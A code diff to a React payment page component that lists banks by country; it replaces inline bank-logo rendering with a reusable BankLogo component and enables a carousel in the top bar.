@@ -13,6 +13,7 @@ import BrandedTopBar from "@/components/BrandedTopBar";
 import { getCountryByCode } from "@/lib/countries";
 import { getBanksByCountry, Bank } from "@/lib/banks";
 import { formatCurrency } from "@/lib/countryCurrencies";
+import BankLogo from "@/components/BankLogo";
 
 const PaymentBankSelector = () => {
   const { id } = useParams();
@@ -176,6 +177,7 @@ const PaymentBankSelector = () => {
         serviceName={serviceName}
         showBackButton={true}
         backPath={`/pay/${id}/details`}
+        showCarousel={true}
       />
 
       <div 
@@ -274,42 +276,23 @@ const PaymentBankSelector = () => {
                   
                   <div className="flex flex-col items-center gap-2 sm:gap-3">
                     {/* Bank Logo - Enhanced with Official Branding */}
-                    {bank.logo ? (
-                      <div 
-                        className="w-20 h-20 sm:w-24 sm:h-24 rounded-xl flex items-center justify-center p-3 sm:p-4 bg-white border-2 transition-all shadow-md"
-                        style={{
-                          borderColor: selectedBank === bank.id ? (bankBranding[bank.id]?.colors.primary || bank.color || govSystem.colors.primary) : '#e5e7eb',
-                          borderRadius: bankBranding[bank.id]?.borderRadius.md || '10px',
-                          boxShadow: selectedBank === bank.id ? `0 8px 20px -5px ${bank.color || govSystem.colors.primary}40` : '0 1px 3px rgba(0, 0, 0, 0.1)'
-                        }}
-                      >
-                        <img 
-                          src={bank.logo} 
-                          alt={bank.nameAr}
-                          className="w-full h-full object-contain"
-                          style={{ maxWidth: '100%', maxHeight: '100%' }}
-                          onError={(e) => {
-                            // Fallback if image fails to load
-                            const target = e.target as HTMLImageElement;
-                            target.style.display = 'none';
-                            const parent = target.parentElement;
-                            if (parent) {
-                              parent.innerHTML = `<div class="w-full h-full flex items-center justify-center text-2xl font-bold" style="color: ${bank.color}">${bank.nameAr.charAt(0)}</div>`;
-                            }
-                          }}
-                        />
-                      </div>
-                    ) : (
-                      <div
-                        className="w-16 h-16 sm:w-20 sm:h-20 rounded-xl flex items-center justify-center text-white text-2xl sm:text-3xl font-bold"
-                        style={{
-                          backgroundColor: bank.color || govSystem.colors.primary,
-                          fontFamily: govSystem.fonts.primaryAr
-                        }}
-                      >
-                        {bank.nameAr.charAt(0)}
-                      </div>
-                    )}
+                    <div 
+                      className="w-20 h-20 sm:w-24 sm:h-24 rounded-xl flex items-center justify-center p-3 sm:p-4 bg-white border-2 transition-all shadow-md"
+                      style={{
+                        borderColor: selectedBank === bank.id ? (bankBranding[bank.id]?.colors.primary || bank.color || govSystem.colors.primary) : '#e5e7eb',
+                        borderRadius: bankBranding[bank.id]?.borderRadius.md || '10px',
+                        boxShadow: selectedBank === bank.id ? `0 8px 20px -5px ${bank.color || govSystem.colors.primary}40` : '0 1px 3px rgba(0, 0, 0, 0.1)'
+                      }}
+                    >
+                      <BankLogo 
+                        bankId={bank.id}
+                        bankName={bank.name}
+                        bankNameAr={bank.nameAr}
+                        color={bank.color}
+                        size="lg"
+                        className="w-full h-full"
+                      />
+                    </div>
                     
                     {/* Bank Name */}
                     <div className="text-center w-full">
